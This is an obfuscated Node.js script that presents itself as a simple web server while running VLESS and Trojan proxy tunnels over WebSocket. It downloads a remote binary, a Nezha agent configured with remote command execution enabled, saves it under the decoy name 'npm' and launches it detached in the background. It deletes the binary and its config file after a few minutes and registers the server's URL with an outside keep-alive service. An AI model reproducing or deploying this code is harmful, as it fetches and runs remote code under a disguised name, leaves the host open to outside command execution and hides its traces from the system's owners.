function _0x583c(){const _0x218e99=['then','test','readUInt8','from','finish','log','net','base64','Server','1.1.1.1','end','every','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','connect','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','AUTO_ACCESS','createServer','utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','5135459pQJgbH','write','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','http','Failed\x20to\x20resolve\x20','decode','close','data','108LcdZbF','includes','unlink','53a3317d-bfcb-4bc5-adbf-3ad6cf4b66d1','pipe','replace','false','--tls','https://arm64.ssss.nyc.mn/v1','&fp=chrome&type=ws&host=','&path=%2F','https://amd64.ssss.nyc.mn/agent','arm','pop','type','asOrganization','slice','Status','env','2435ZzgFCw','buffer','child_process','url','createWriteStream','join','arm64','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','digest','map','true','NEZHA_KEY','chmod\x20+x\x20npm','SUB_PATH','catch','15053VXgGxC','reduce','sub','NEZHA_PORT','once','connection','7787140mveCwG','DOMAIN','443','npm\x20is\x20already\x20running,\x20skip\x20running...','config.yaml','2053','https://dns.google/resolve?name=','Unknown','Server\x20is\x20running\x20on\x20port\x20','637785eQVzhY','npm\x20is\x20running','https://','&type=A','trojan://','stream','\x20-p\x20','/bin/bash','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','readUInt16BE','setsid\x20nohup\x20./npm\x20-s\x20','https://speed.cloudflare.com/meta','Hello\x20world!','2096','8.8.4.4','writeHead','crypto','get','3454542DCNLBt','1234.abc.com','Answer','trim','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','update','index.html','text/html','concat','8443','find','split','aarch64','substr','2087','Automatic\x20Access\x20Task\x20added\x20successfully','NAME','20OTanRI','writeFileSync','error:\x20','4878LKpbBp','10172800DmFoVr','length','text/plain','2083','send','error','toString','\x20with\x20all\x20DNS\x20servers'];_0x583c=function(){return _0x218e99;};return _0x583c();}const _0x2dd97c=_0x3791;(function(_0x2108ff,_0xaf4e4){const _0xf6ada3=_0x3791,_0x1abff5=_0x2108ff();while(!![]){try{const _0x12c5d2=-parseInt(_0xf6ada3(0x8e))/0x1*(parseInt(_0xf6ada3(0xea))/0x2)+parseInt(_0xf6ada3(0x9d))/0x3*(parseInt(_0xf6ada3(0xc1))/0x4)+parseInt(_0xf6ada3(0x7e))/0x5*(-parseInt(_0xf6ada3(0xc4))/0x6)+parseInt(_0xf6ada3(0xe1))/0x7+parseInt(_0xf6ada3(0xc5))/0x8+-parseInt(_0xf6ada3(0xaf))/0x9+-parseInt(_0xf6ada3(0x94))/0xa;if(_0x12c5d2===_0xaf4e4)break;else _0x1abff5['push'](_0x1abff5['shift']());}catch(_0x45a029){_0x1abff5['push'](_0x1abff5['shift']());}}}(_0x583c,0xaa223));const os=require('os'),http=require(_0x2dd97c(0xe5)),fs=require('fs'),axios=require('axios'),net=require(_0x2dd97c(0xd3)),path=require('path'),crypto=require(_0x2dd97c(0xad)),{Buffer}=require(_0x2dd97c(0x7f)),{exec,execSync}=require(_0x2dd97c(0x80)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2dd97c(0x7d)]['UUID']||_0x2dd97c(0xed),NEZHA_SERVER=process[_0x2dd97c(0x7d)][_0x2dd97c(0xda)]||'',NEZHA_PORT=process[_0x2dd97c(0x7d)][_0x2dd97c(0x91)]||'',NEZHA_KEY=process['env'][_0x2dd97c(0x8a)]||'',DOMAIN=process['env'][_0x2dd97c(0x95)]||_0x2dd97c(0xb0),AUTO_ACCESS=process['env'][_0x2dd97c(0xdd)]||![],WSPATH=process[_0x2dd97c(0x7d)]['WSPATH']||UUID[_0x2dd97c(0x7b)](0x0,0x8),SUB_PATH=process[_0x2dd97c(0x7d)][_0x2dd97c(0x8c)]||_0x2dd97c(0x90),NAME=process[_0x2dd97c(0x7d)][_0x2dd97c(0xc0)]||'',PORT=process[_0x2dd97c(0x7d)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x3226a9=_0x2dd97c;try{const _0x177248=await axios['get'](_0x3226a9(0xa8)),_0x53968a=_0x177248[_0x3226a9(0xe9)];ISP=(_0x53968a['country']+'-'+_0x53968a[_0x3226a9(0x7a)])['replace'](/ /g,'_');}catch(_0xf655a8){ISP=_0x3226a9(0x9b);}};GetISP();const httpServer=http[_0x2dd97c(0xde)]((_0x10fb0a,_0x2c58da)=>{const _0x2e54a8=_0x2dd97c;if(_0x10fb0a[_0x2e54a8(0x81)]==='/'){const _0x4ad418=path[_0x2e54a8(0x83)](__dirname,_0x2e54a8(0xb6));fs['readFile'](_0x4ad418,'utf8',(_0x5a3a54,_0x2978e1)=>{const _0xcf0e84=_0x2e54a8;if(_0x5a3a54){_0x2c58da['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x2c58da[_0xcf0e84(0xd7)](_0xcf0e84(0xa9));return;}_0x2c58da[_0xcf0e84(0xac)](0xc8,{'Content-Type':_0xcf0e84(0xb7)}),_0x2c58da[_0xcf0e84(0xd7)](_0x2978e1);});return;}else{if(_0x10fb0a[_0x2e54a8(0x81)]==='/'+SUB_PATH){const _0x5f0775=NAME?NAME+'-'+ISP:ISP,_0x556e7e='vless://'+UUID+_0x2e54a8(0xa5)+DOMAIN+_0x2e54a8(0xf3)+DOMAIN+_0x2e54a8(0x75)+WSPATH+'#'+_0x5f0775,_0x5da69e=_0x2e54a8(0xa1)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x2e54a8(0xf3)+DOMAIN+_0x2e54a8(0x75)+WSPATH+'#'+_0x5f0775,_0x454aa7=_0x556e7e+'\x0a'+_0x5da69e,_0x4b61cb=Buffer[_0x2e54a8(0xd0)](_0x454aa7)[_0x2e54a8(0xcb)](_0x2e54a8(0xd4));_0x2c58da['writeHead'](0xc8,{'Content-Type':_0x2e54a8(0xc7)}),_0x2c58da[_0x2e54a8(0xd7)](_0x4b61cb+'\x0a');}else _0x2c58da[_0x2e54a8(0xac)](0x194,{'Content-Type':_0x2e54a8(0xc7)}),_0x2c58da['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2dd97c(0xd5))]({'server':httpServer}),uuid=UUID[_0x2dd97c(0xef)](/-/g,''),DNS_SERVERS=[_0x2dd97c(0xab),_0x2dd97c(0xd6)];function resolveHost(_0x4fbe10){return new Promise((_0x14e94b,_0x32a5f5)=>{const _0x439d52=_0x3791;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x439d52(0xce)](_0x4fbe10)){_0x14e94b(_0x4fbe10);return;}let _0xf26b77=0x0;function _0x19300e(){const _0xdf0fe=_0x439d52;if(_0xf26b77>=DNS_SERVERS[_0xdf0fe(0xc6)]){_0x32a5f5(new Error(_0xdf0fe(0xe6)+_0x4fbe10+_0xdf0fe(0xcc)));return;}const _0xe146ae=DNS_SERVERS[_0xf26b77];_0xf26b77++;const _0x143b1a=_0xdf0fe(0x9a)+encodeURIComponent(_0x4fbe10)+_0xdf0fe(0xa0);axios['get'](_0x143b1a,{'timeout':0x1388,'headers':{'Accept':_0xdf0fe(0xb3)}})[_0xdf0fe(0xcd)](_0x327a07=>{const _0x3b24ca=_0xdf0fe,_0x39ca19=_0x327a07[_0x3b24ca(0xe9)];if(_0x39ca19[_0x3b24ca(0x7c)]===0x0&&_0x39ca19[_0x3b24ca(0xb1)]&&_0x39ca19['Answer'][_0x3b24ca(0xc6)]>0x0){const _0x59b0a3=_0x39ca19['Answer'][_0x3b24ca(0xba)](_0x189949=>_0x189949[_0x3b24ca(0x79)]===0x1);if(_0x59b0a3){_0x14e94b(_0x59b0a3['data']);return;}}_0x19300e();})['catch'](_0x85a39f=>{_0x19300e();});}_0x19300e();});}function handleVlessConnection(_0x476913,_0x3140ac){const _0x5aed1f=_0x2dd97c,[_0x480d65]=_0x3140ac,_0x57a323=_0x3140ac['slice'](0x1,0x11);if(!_0x57a323[_0x5aed1f(0xd8)]((_0x340b06,_0x14d68c)=>_0x340b06==parseInt(uuid[_0x5aed1f(0xbd)](_0x14d68c*0x2,0x2),0x10)))return![];let _0x45b4fc=_0x3140ac[_0x5aed1f(0x7b)](0x11,0x12)[_0x5aed1f(0xcf)]()+0x13;const _0x343053=_0x3140ac[_0x5aed1f(0x7b)](_0x45b4fc,_0x45b4fc+=0x2)['readUInt16BE'](0x0),_0x33d5a2=_0x3140ac[_0x5aed1f(0x7b)](_0x45b4fc,_0x45b4fc+=0x1)[_0x5aed1f(0xcf)](),_0x268235=_0x33d5a2==0x1?_0x3140ac[_0x5aed1f(0x7b)](_0x45b4fc,_0x45b4fc+=0x4)[_0x5aed1f(0x83)]('.'):_0x33d5a2==0x2?new TextDecoder()[_0x5aed1f(0xe7)](_0x3140ac[_0x5aed1f(0x7b)](_0x45b4fc+0x1,_0x45b4fc+=0x1+_0x3140ac['slice'](_0x45b4fc,_0x45b4fc+0x1)[_0x5aed1f(0xcf)]())):_0x33d5a2==0x3?_0x3140ac[_0x5aed1f(0x7b)](_0x45b4fc,_0x45b4fc+=0x10)[_0x5aed1f(0x8f)]((_0x1275e3,_0x29d200,_0x4f559a,_0x5d045f)=>_0x4f559a%0x2?_0x1275e3[_0x5aed1f(0xb8)](_0x5d045f[_0x5aed1f(0x7b)](_0x4f559a-0x1,_0x4f559a+0x1)):_0x1275e3,[])['map'](_0x104929=>_0x104929[_0x5aed1f(0xa6)](0x0)['toString'](0x10))['join'](':'):'';_0x476913[_0x5aed1f(0xc9)](new Uint8Array([_0x480d65,0x0]));const _0x4495a0=createWebSocketStream(_0x476913);return resolveHost(_0x268235)[_0x5aed1f(0xcd)](_0x435f8f=>{const _0x2f0355=_0x5aed1f;net[_0x2f0355(0xdb)]({'host':_0x435f8f,'port':_0x343053},function(){const _0x272312=_0x2f0355;this[_0x272312(0xe2)](_0x3140ac['slice'](_0x45b4fc)),_0x4495a0['on'](_0x272312(0xca),()=>{})[_0x272312(0xee)](this)['on'](_0x272312(0xca),()=>{})[_0x272312(0xee)](_0x4495a0);})['on'](_0x2f0355(0xca),()=>{});})[_0x5aed1f(0x8d)](_0xfbf60e=>{const _0x5d8070=_0x5aed1f;net[_0x5d8070(0xdb)]({'host':_0x268235,'port':_0x343053},function(){const _0x8bf407=_0x5d8070;this[_0x8bf407(0xe2)](_0x3140ac[_0x8bf407(0x7b)](_0x45b4fc)),_0x4495a0['on'](_0x8bf407(0xca),()=>{})[_0x8bf407(0xee)](this)['on'](_0x8bf407(0xca),()=>{})[_0x8bf407(0xee)](_0x4495a0);})['on'](_0x5d8070(0xca),()=>{});}),!![];}function handleTrojanConnection(_0x9919b9,_0x1da45f){const _0x346ac5=_0x2dd97c;try{if(_0x1da45f[_0x346ac5(0xc6)]<0x3a)return![];const _0x5896a4=_0x1da45f[_0x346ac5(0x7b)](0x0,0x38)[_0x346ac5(0xcb)](),_0x47c955=[UUID];let _0x2fe53c=null;for(const _0x106983 of _0x47c955){const _0x143453=crypto['createHash']('sha224')[_0x346ac5(0xb5)](_0x106983)[_0x346ac5(0x87)]('hex');if(_0x143453===_0x5896a4){_0x2fe53c=_0x106983;break;}}if(!_0x2fe53c)return![];let _0xd32631=0x38;_0x1da45f[_0xd32631]===0xd&&_0x1da45f[_0xd32631+0x1]===0xa&&(_0xd32631+=0x2);const _0x405144=_0x1da45f[_0xd32631];if(_0x405144!==0x1)return![];_0xd32631+=0x1;const _0x5b6a0d=_0x1da45f[_0xd32631];_0xd32631+=0x1;let _0x163e47,_0x5cca7a;if(_0x5b6a0d===0x1)_0x163e47=_0x1da45f[_0x346ac5(0x7b)](_0xd32631,_0xd32631+0x4)[_0x346ac5(0x83)]('.'),_0xd32631+=0x4;else{if(_0x5b6a0d===0x3){const _0x4e138c=_0x1da45f[_0xd32631];_0xd32631+=0x1,_0x163e47=_0x1da45f[_0x346ac5(0x7b)](_0xd32631,_0xd32631+_0x4e138c)[_0x346ac5(0xcb)](),_0xd32631+=_0x4e138c;}else{if(_0x5b6a0d===0x4)_0x163e47=_0x1da45f[_0x346ac5(0x7b)](_0xd32631,_0xd32631+0x10)[_0x346ac5(0x8f)]((_0x208fee,_0x300426,_0x246225,_0x298045)=>_0x246225%0x2?_0x208fee[_0x346ac5(0xb8)](_0x298045[_0x346ac5(0x7b)](_0x246225-0x1,_0x246225+0x1)):_0x208fee,[])[_0x346ac5(0x88)](_0x1153f9=>_0x1153f9['readUInt16BE'](0x0)[_0x346ac5(0xcb)](0x10))['join'](':'),_0xd32631+=0x10;else return![];}}_0x5cca7a=_0x1da45f[_0x346ac5(0xa6)](_0xd32631),_0xd32631+=0x2;_0xd32631<_0x1da45f[_0x346ac5(0xc6)]&&_0x1da45f[_0xd32631]===0xd&&_0x1da45f[_0xd32631+0x1]===0xa&&(_0xd32631+=0x2);const _0x450457=createWebSocketStream(_0x9919b9);return resolveHost(_0x163e47)[_0x346ac5(0xcd)](_0x473fcd=>{const _0x30e996=_0x346ac5;net[_0x30e996(0xdb)]({'host':_0x473fcd,'port':_0x5cca7a},function(){const _0x13a3bf=_0x30e996;_0xd32631<_0x1da45f[_0x13a3bf(0xc6)]&&this['write'](_0x1da45f[_0x13a3bf(0x7b)](_0xd32631)),_0x450457['on']('error',()=>{})[_0x13a3bf(0xee)](this)['on']('error',()=>{})[_0x13a3bf(0xee)](_0x450457);})['on'](_0x30e996(0xca),()=>{});})[_0x346ac5(0x8d)](_0x5867b5=>{const _0x3dac7b=_0x346ac5;net[_0x3dac7b(0xdb)]({'host':_0x163e47,'port':_0x5cca7a},function(){const _0xda6a7b=_0x3dac7b;_0xd32631<_0x1da45f[_0xda6a7b(0xc6)]&&this[_0xda6a7b(0xe2)](_0x1da45f[_0xda6a7b(0x7b)](_0xd32631)),_0x450457['on'](_0xda6a7b(0xca),()=>{})['pipe'](this)['on']('error',()=>{})[_0xda6a7b(0xee)](_0x450457);})['on'](_0x3dac7b(0xca),()=>{});}),!![];}catch(_0x1172a2){return![];}}wss['on'](_0x2dd97c(0x93),(_0x32bef7,_0x8f6b92)=>{const _0x6de5=_0x2dd97c,_0x1eae62=_0x8f6b92[_0x6de5(0x81)]||'';_0x32bef7[_0x6de5(0x92)]('message',_0x25e3e8=>{const _0x511754=_0x6de5;if(_0x25e3e8[_0x511754(0xc6)]>0x11&&_0x25e3e8[0x0]===0x0){const _0x1eab56=_0x25e3e8[_0x511754(0x7b)](0x1,0x11),_0x5acb06=_0x1eab56[_0x511754(0xd8)]((_0x58b8f9,_0x281fe9)=>_0x58b8f9==parseInt(uuid[_0x511754(0xbd)](_0x281fe9*0x2,0x2),0x10));if(_0x5acb06){!handleVlessConnection(_0x32bef7,_0x25e3e8)&&_0x32bef7['close']();return;}}!handleTrojanConnection(_0x32bef7,_0x25e3e8)&&_0x32bef7[_0x511754(0xe8)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x36328b=_0x2dd97c,_0x211ffa=os['arch']();return _0x211ffa===_0x36328b(0x77)||_0x211ffa===_0x36328b(0x84)||_0x211ffa===_0x36328b(0xbc)?!NEZHA_PORT?_0x36328b(0xf2):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x36328b(0xd9):_0x36328b(0x76);},downloadFile=async()=>{const _0x48eaf2=_0x2dd97c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x57963e=getDownloadUrl(),_0x5c7b2b=await axios({'method':_0x48eaf2(0xae),'url':_0x57963e,'responseType':_0x48eaf2(0xa2)}),_0x48aab2=fs[_0x48eaf2(0x82)]('npm');return _0x5c7b2b['data'][_0x48eaf2(0xee)](_0x48aab2),new Promise((_0x157e96,_0x46177f)=>{const _0x47b898=_0x48eaf2;_0x48aab2['on'](_0x47b898(0xd1),()=>{const _0x39b90c=_0x47b898;console[_0x39b90c(0xd2)](_0x39b90c(0x86)),exec(_0x39b90c(0x8b),_0x2c988d=>{if(_0x2c988d)_0x46177f(_0x2c988d);_0x157e96();});}),_0x48aab2['on'](_0x47b898(0xca),_0x46177f);});}catch(_0x1a2a58){throw _0x1a2a58;}},runnz=async()=>{const _0x68095=_0x2dd97c;try{const _0x3b63a9=execSync(_0x68095(0xe4),{'encoding':_0x68095(0xdf)});if(_0x3b63a9[_0x68095(0xb2)]()!==''){console[_0x68095(0xd2)](_0x68095(0x97));return;}}catch(_0x410fd6){}await downloadFile();let _0x19571b='',_0x40ca2b=[_0x68095(0x96),_0x68095(0xb9),_0x68095(0xaa),_0x68095(0xbe),_0x68095(0xc8),_0x68095(0x99)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x442f5b=_0x40ca2b['includes'](NEZHA_PORT)?_0x68095(0xf1):'';_0x19571b=_0x68095(0xa7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x68095(0xa3)+NEZHA_KEY+'\x20'+_0x442f5b+_0x68095(0xe0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x25be0d=NEZHA_SERVER[_0x68095(0xeb)](':')?NEZHA_SERVER[_0x68095(0xbb)](':')[_0x68095(0x78)]():'',_0x9f6323=_0x40ca2b[_0x68095(0xeb)](_0x25be0d)?_0x68095(0x89):_0x68095(0xf0),_0x330879='client_secret:\x20'+NEZHA_KEY+_0x68095(0xb4)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x9f6323+_0x68095(0xe3)+UUID;fs[_0x68095(0xc2)](_0x68095(0x98),_0x330879);}_0x19571b='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x68095(0xd2)](_0x68095(0xdc));return;}}try{exec(_0x19571b,{'shell':_0x68095(0xa4)},_0x64a048=>{const _0x5e9e1f=_0x68095;if(_0x64a048)console[_0x5e9e1f(0xca)]('npm\x20running\x20error:',_0x64a048);else console[_0x5e9e1f(0xd2)](_0x5e9e1f(0x9e));});}catch(_0x3c6651){console['error'](_0x68095(0xc3)+_0x3c6651);}};function _0x3791(_0x569a29,_0x7d65c2){_0x569a29=_0x569a29-0x75;const _0x583ce0=_0x583c();let _0x37915c=_0x583ce0[_0x569a29];return _0x37915c;}async function addAccessTask(){const _0x532859=_0x2dd97c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x104c93=_0x532859(0x9f)+DOMAIN+'/'+SUB_PATH;try{const _0x288910=await axios['post'](_0x532859(0x85),{'url':_0x104c93},{'headers':{'Content-Type':'application/json'}});console[_0x532859(0xd2)](_0x532859(0xbf));}catch(_0x434535){}}const delFiles=()=>{const _0x3835c8=_0x2dd97c;fs['unlink']('npm',()=>{}),fs[_0x3835c8(0xec)](_0x3835c8(0x98),()=>{});};httpServer['listen'](PORT,()=>{const _0x4d0a2c=_0x2dd97c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4d0a2c(0xd2)](_0x4d0a2c(0x9c)+PORT);});
